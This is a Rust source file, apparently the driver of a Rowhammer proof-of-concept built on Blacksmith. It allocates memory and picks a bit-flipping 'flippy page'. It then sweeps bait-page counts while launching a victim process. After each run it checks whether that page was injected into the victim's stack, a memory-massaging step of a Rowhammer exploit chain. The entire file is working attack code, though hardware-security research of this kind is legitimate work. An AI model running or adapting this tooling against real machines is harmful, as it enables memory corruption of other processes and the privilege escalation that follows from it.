use std::ptr::null_mut;

use anyhow::bail;
use bs_poc::{
    allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
    hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
    memory::{
        mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock, PfnResolver,
    },
    util::{KB, MB},
    victim::{
        stack_process::{find_flippy_page, InjectionConfig},
        HammerVictim, HammerVictimError, StackProcess,
    },
};
use clap::{arg, Parser};
use indicatif::MultiProgress;
use log::{debug, info, warn};

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<Option<usize>>,
    #[arg(short = 'b', long)]
    bait_before: Option<usize>,
    #[arg(short = 'a', long)]
    bait_after: Option<usize>,
    #[arg(long, default_value = "mmap")]
    alloc_strategy: AllocStrategy,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    target: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum AllocStrategy {
    Spoiler,
    Pfn,
    Mmap,
}

fn main() -> anyhow::Result<()> {
    env_logger::init();
    const PAGE_SIZE: usize = 4096;
    //const NUM_PAGES: usize = 1 << 21; // 8 GB
    //const ALLOC_SIZE: usize = NUM_PAGES * PAGE_SIZE;
    let args = CliArgs::parse();
    info!("CLI args: {:?}", args);
    let bs_config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&bs_config);
    //0..64 {
    //let bait_before = args.bait_before;
    let bait_before_range = args.bait_before.map(|b| b..b + 1).unwrap_or(0..30);
    let bait_after_range = args.bait_after.map(|b| b..b + 1).unwrap_or(0..30);
    let progress = MultiProgress::new();
    for bait_before in bait_before_range {
        for bait_after in bait_after_range.clone() {
            println!("bait_before,bait_after: {},{}", bait_before, bait_after);
            for _ in 0..args.repeat.unwrap_or(Some(1)).unwrap_or(2_usize.pow(32)) {
                // allocate bait page, get PFN
                let x = match args.alloc_strategy {
                    AllocStrategy::Spoiler => {
                        let mut spoiler =
                            Spoiler::new(mem_config, bs_config.threshold, Some(progress.clone()));
                        spoiler.alloc_consec_blocks(4 * MB)?
                    }
                    AllocStrategy::Pfn => {
                        let mut pfn = Pfn::new();
                        pfn.alloc_consec_blocks(4 * MB)?
                    }
                    AllocStrategy::Mmap => {
                        let x: *mut u8 = mmap(null_mut(), 4 * MB);
                        if x.is_null() {
                            bail!("Failed to allocate memory");
                        }
                        ConsecBlocks::new(vec![MemBlock::new(x, 4 * MB)])
                    }
                };
                let flippy_page = unsafe { x.ptr().byte_add(64 * KB) as *mut libc::c_void };
                debug!("Collecting PFNs...");
                let target_pfn = flippy_page.pfn()? >> 12;
                //x.log_pfns();
                debug!("PFNs collected");

                info!("PFN: {:?}", flippy_page.pfn());
                info!("Launching victim");
                let mut victim = match StackProcess::new(
                    &args.target,
                    InjectionConfig {
                        flippy_page,
                        flippy_page_size: PAGE_SIZE,
                        bait_count_after: bait_after,
                        bait_count_before: bait_before,
                    },
                ) {
                    Ok(v) => v,
                    Err(e) => {
                        warn!("Error creating victim: {:?}", e);
                        println!("None");
                        continue;
                    }
                };
                victim.init();
                let output = match victim.check() {
                    Ok(output) => output,
                    Err(HammerVictimError::NoFlips) => "No flips".to_string(),
                    Err(HammerVictimError::IoError(e)) => e.to_string(),
                };
                //if output.contains(&format!("{:x}", target_pfn)) {
                //    bail!("YES MAN: {},{}", bait_before, bait_after);
                //}
                let flippy_page = find_flippy_page(target_pfn, victim.pid())?;
                if let Some(flippy_region) = &flippy_page {
                    info!("Flippy page reused in region {:?}", flippy_region);
                } else {
                    warn!("Flippy page not reused");
                }
                println!("{:?}", flippy_page);
                info!("Child output:\n{}", output);
                victim.stop();
                x.dealloc();
            }
        }
    }
    Ok(())
}
